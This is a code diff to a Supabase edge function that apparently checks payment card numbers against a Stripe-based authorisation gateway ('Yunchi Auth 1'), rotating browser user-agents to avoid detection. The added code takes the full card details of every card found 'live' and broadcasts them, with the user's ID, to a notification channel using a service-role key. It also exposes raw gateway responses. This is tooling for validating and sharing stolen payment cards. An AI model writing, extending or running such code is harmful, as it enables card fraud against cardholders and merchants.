@@ -9,7 +9,36 @@ const corsHeaders = {
 };
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
-const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!
+const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+
+// Notify charged card (fire-and-forget) - broadcasts to channel
+const notifyChargedCard = (
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string
+) => {
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
+
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      user_id: userId,
+      card_details: cardDetails,
+      status,
+      response_message: responseMessage,
+      amount,
+      gateway,
+    }),
+  }).catch((err) => console.error("[STRIPE-AUTH] notify-charged-card error:", err));
+};
 
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -95,11 +124,12 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     }
 
     
-    // Return only necessary fields - no raw response
+    // Return with raw response for debugging
     return {
       computedStatus,
       apiStatus: data.status || 'UNKNOWN',
-      apiMessage
+      apiMessage,
+      rawResponse: rawText
     };
   } catch (error) {
     console.error(`[STRIPE-AUTH] Attempt ${attempt} - Fetch error:`, error);
@@ -184,6 +214,18 @@ serve(async (req) => {
 
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
+
+    // Broadcast LIVE cards to channel (fire-and-forget)
+    if (data.computedStatus === 'live') {
+      notifyChargedCard(
+        user.id,
+        cc,
+        'CHARGED',
+        String(data.apiMessage || 'LIVE'),
+        '$0.00',
+        'Yunchi Auth 1'
+      );
+    }
 
     return new Response(
       JSON.stringify(data),
